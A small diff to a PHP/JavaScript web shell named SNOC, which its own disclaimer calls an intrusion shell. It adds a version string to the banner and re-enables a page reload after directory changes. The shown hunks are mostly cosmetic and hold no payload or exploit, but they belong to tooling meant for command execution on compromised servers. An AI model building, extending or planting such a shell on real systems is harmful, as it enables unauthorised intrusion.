@@ -146,6 +146,7 @@ function echoJS()
 	};
 
 	function Shell(){
+		var snoc_version = "1.0 Brand New Beta (tm)";
 		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
 		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
 		var history = new Array();				// command history stack
@@ -175,7 +176,7 @@ function echoJS()
 ' #####  #     # #######  #####  <br />'+                                
 '</pre><br />');
 
-		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br />');
+		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br /><span style="margin-left:50px;">Version '+snoc_version+'</span><br /><br />');
 	
 		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
 		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
@@ -389,7 +390,7 @@ function echoJS()
 				current_dir = data.substr(i+1,data.length).replace(/(<([^>]+)>)/ig,"").replace(/\n/g,"");
 				printShell(output);
 				$("#dir").empty().append(current_dir);	// update the current_dir field
-				//location.reload();
+				location.reload();
 			});
 		}
 
